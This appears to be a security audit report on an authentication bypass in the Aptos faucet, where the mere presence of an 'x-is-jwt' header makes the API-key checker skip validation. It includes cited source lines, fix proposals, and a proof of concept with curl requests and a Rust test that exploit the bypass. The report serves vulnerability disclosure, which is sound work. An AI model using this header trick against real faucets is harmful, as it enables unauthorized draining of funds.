# Audit Report

## Title
Critical Authentication Bypass in Aptos Faucet via X-IS-JWT Header Injection

## Summary
The Aptos faucet's `AuthTokenChecker` contains a critical authentication bypass vulnerability. An attacker can completely bypass API key authentication by simply adding the `x-is-jwt` header to their request, even without providing a valid JWT token. This allows unlimited unauthorized fund requests, potentially draining the faucet.

## Finding Description

The vulnerability exists in the interaction between `AuthTokenChecker` and the JWT validation system. The faucet is designed to support two authentication modes:

1. **API Key Authentication**: Validated by `AuthTokenChecker` using the `Authorization` header
2. **JWT Authentication**: Validated by `FirebaseJwtVerifier` (when configured)

The `x-is-jwt` header is used to signal which mode should be active. However, `AuthTokenChecker` unconditionally skips validation when this header is present: [1](#0-0) 

The assumption is that JWT validation will occur elsewhere. However, JWT validation ONLY happens in `RedisRatelimitChecker` when explicitly configured with JWT mode: [2](#0-1) 

**The vulnerability occurs when:**
1. A faucet is configured with `AuthTokenChecker` (requiring API keys)
2. BUT does NOT have `RedisRatelimitChecker` with JWT mode enabled
3. OR has `RedisRatelimitChecker` configured with IP-based rate limiting instead

**Attack Flow:**
1. Attacker sends a fund request to the faucet endpoint
2. Includes `x-is-jwt` header (any value, even empty string)
3. Does NOT include a valid `Authorization` token
4. `AuthTokenChecker.check()` sees `x-is-jwt` header exists
5. Returns `Ok(vec![])` - passing without validation
6. No JWT checker exists to validate the missing/invalid JWT
7. Request is approved without any authentication
8. Faucet funds the attacker's account

The header injection happens through the standard HTTP request flow: [3](#0-2) 

Headers are passed to `preprocess_request()` which creates `CheckerData`: [4](#0-3) 

The vulnerable configuration is demonstrated in the test configuration: [5](#0-4) 

This configuration has `AuthTokenChecker` but no JWT validation, making it vulnerable.

## Impact Explanation

**Severity: CRITICAL** - This meets the "Loss of Funds (theft or minting)" category from the Aptos bug bounty program.

**Impact:**
- **Complete Authentication Bypass**: Attackers can bypass all API key requirements
- **Unlimited Fund Drainage**: Attackers can drain the faucet by making repeated requests
- **No Rate Limiting**: If no `RedisRatelimitChecker` is configured, there are no limits
- **Testnet Disruption**: Legitimate users cannot obtain testnet tokens
- **Mainnet Risk**: If production faucets use this configuration, real economic value could be stolen

The vulnerability affects any faucet deployment using `AuthTokenChecker` without proper JWT validation configured. This is a design flaw where authentication responsibility is delegated to an optional component.

## Likelihood Explanation

**Likelihood: HIGH**

The vulnerability is highly likely to be exploited because:

1. **Trivial Exploit**: Attack requires only adding one HTTP header - no cryptographic operations or complex timing
2. **No Prerequisites**: Attacker needs no credentials, insider access, or special infrastructure
3. **Publicly Accessible**: Faucets are intentionally exposed to the internet
4. **Visible Configuration Gap**: The vulnerable configuration (AuthTokenChecker without JWT validation) is a plausible deployment scenario
5. **Automated Exploitation**: Attack can be scripted to drain funds systematically

The test configuration file itself demonstrates this vulnerable setup is considered valid by the codebase.

## Recommendation

**Immediate Fix: Enforce JWT validation when `x-is-jwt` header is present**

The `AuthTokenChecker` should NOT skip validation just because `x-is-jwt` is present. Instead:

**Option 1: Create a dedicated JWT checker**
```rust
// New file: crates/aptos-faucet/core/src/checkers/jwt.rs
pub struct JwtChecker {
    pub jwt_verifier: Arc<FirebaseJwtVerifier>,
}

#[async_trait]
impl CheckerTrait for JwtChecker {
    async fn check(&self, data: CheckerData, _dry_run: bool) -> Result<Vec<RejectionReason>, AptosTapError> {
        // Only validate if x-is-jwt header is present
        if !data.headers.contains_key(X_IS_JWT_HEADER) {
            return Ok(vec![]);
        }
        
        // Validate the JWT
        self.jwt_verifier.validate_jwt(data.headers).await?;
        Ok(vec![])
    }
    
    fn cost(&self) -> u8 { 50 }
}
```

**Option 2: Remove the bypass logic**
Remove the `x-is-jwt` header check from `AuthTokenChecker` entirely and make JWT validation a separate, always-required checker when configured: [1](#0-0) 

Delete these lines and let `AuthTokenChecker` always validate the Authorization header when configured.

**Configuration Validation:**
Add startup validation to ensure that if `AuthTokenChecker` is configured, either:
- No `x-is-jwt` header logic exists, OR
- A JWT checker is also configured

## Proof of Concept

```bash
# Vulnerable faucet configuration (AuthTokenChecker without JWT validation)
# Save as vulnerable_config.yaml - similar to testing_checkers.yaml

# Step 1: Start vulnerable faucet
cargo run -- run -c vulnerable_config.yaml

# Step 2: Exploit - bypass authentication by adding x-is-jwt header
curl -X POST http://localhost:8081/fund \
  -H "Content-Type: application/json" \
  -H "x-is-jwt: true" \
  -d '{
    "amount": 100000000000,
    "address": "0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef"
  }'

# Expected: Request succeeds WITHOUT providing Authorization header
# Actual Security Requirement: Should reject with "Authorization header missing"

# Step 3: Verify bypass - repeat without x-is-jwt header
curl -X POST http://localhost:8081/fund \
  -H "Content-Type: application/json" \
  -d '{
    "amount": 100000000000,
    "address": "0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef"
  }'

# Expected: Request rejected - "Authorization header missing"
# This confirms the x-is-jwt header bypasses AuthTokenChecker
```

**Rust Integration Test:**
```rust
#[tokio::test]
async fn test_jwt_header_bypass_vulnerability() -> Result<()> {
    // Start server with AuthTokenChecker but no JWT validation
    let config = testing_checkers_config_without_jwt();
    let (port, _handle) = start_server(&config).await?;
    
    // Attempt 1: No headers - should fail
    let response1 = reqwest::Client::new()
        .post(format!("http://127.0.0.1:{}/fund", port))
        .json(&FundRequest {
            amount: Some(100),
            address: Some("0xabc...".to_string()),
            ..Default::default()
        })
        .send()
        .await?;
    assert_eq!(response1.status(), StatusCode::FORBIDDEN); // Expected
    
    // Attempt 2: With x-is-jwt header but NO valid JWT - VULNERABILITY
    let response2 = reqwest::Client::new()
        .post(format!("http://127.0.0.1:{}/fund", port))
        .header("x-is-jwt", "true")
        .json(&FundRequest {
            amount: Some(100),
            address: Some("0xabc...".to_string()),
            ..Default::default()
        })
        .send()
        .await?;
    
    // VULNERABILITY: This should fail but succeeds
    assert_eq!(response2.status(), StatusCode::OK); // Authentication bypassed!
    
    Ok(())
}
```

**Notes**

This vulnerability is a critical design flaw in the faucet's authentication architecture. The delegation of JWT validation to an optional rate-limiting component creates a dangerous authentication gap. The `x-is-jwt` header mechanism was intended to differentiate between API key and JWT authentication modes, but it inadvertently creates a bypass when JWT validation is not configured.

The vulnerability is particularly concerning because:
1. The vulnerable configuration appears in official test files
2. No warnings exist about this authentication gap
3. The configuration system allows this insecure setup
4. The bypass is invisible in code review without understanding the full checker chain

Production deployments must be audited immediately to ensure that any faucet using `AuthTokenChecker` also has proper JWT validation configured if JWT authentication is intended to be supported.

### Citations

**File:** crates/aptos-faucet/core/src/checkers/auth_token.rs (L37-40)
```rust
        // Don't check if the request has X_IS_JWT_HEADER set.
        if data.headers.contains_key(X_IS_JWT_HEADER) {
            return Ok(vec![]);
        }
```

**File:** crates/aptos-faucet/core/src/checkers/redis_ratelimit.rs (L44-51)
```rust
    pub async fn ratelimit_key_value(&self, data: &CheckerData) -> Result<String, AptosTapError> {
        match self {
            RatelimitKeyProvider::Ip => Ok(data.source_ip.to_string()),
            RatelimitKeyProvider::Jwt(jwt_verifier) => {
                jwt_verifier.validate_jwt(data.headers.clone()).await
            },
        }
    }
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L102-111)
```rust
    async fn fund(
        &self,
        fund_request: Json<FundRequest>,
        asset: poem_openapi::param::Query<Option<String>>,
        // This automagically uses FromRequest to get this data from the request.
        // It takes into things like X-Forwarded-IP and X-Real-IP.
        source_ip: RealIp,
        // Same thing, this uses FromRequest.
        header_map: &HeaderMap,
    ) -> poem::Result<Json<FundResponse>, AptosTapErrorResponse> {
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L237-242)
```rust
        let checker_data = CheckerData {
            receiver,
            source_ip,
            headers: Arc::new(header_map.clone()),
            time_request_received_secs: get_current_time_secs(),
        };
```

**File:** crates/aptos-faucet/configs/testing_checkers.yaml (L7-18)
```yaml
checker_configs:
  - type: "AuthToken"
    file: "/tmp/auth_tokens.txt"
  - type: "IpBlocklist"
    file: "/tmp/ip_blocklist.txt"
  - type: "RefererBlocklist"
    file: "/tmp/referer_blocklist.txt"
  - type: "MagicHeader"
    magic_header_key: "what_wallet_my_guy"
    magic_header_value: "the_wallet_that_rocks"
  - type: "MemoryRatelimit"
    max_requests_per_day: 1000000000
```
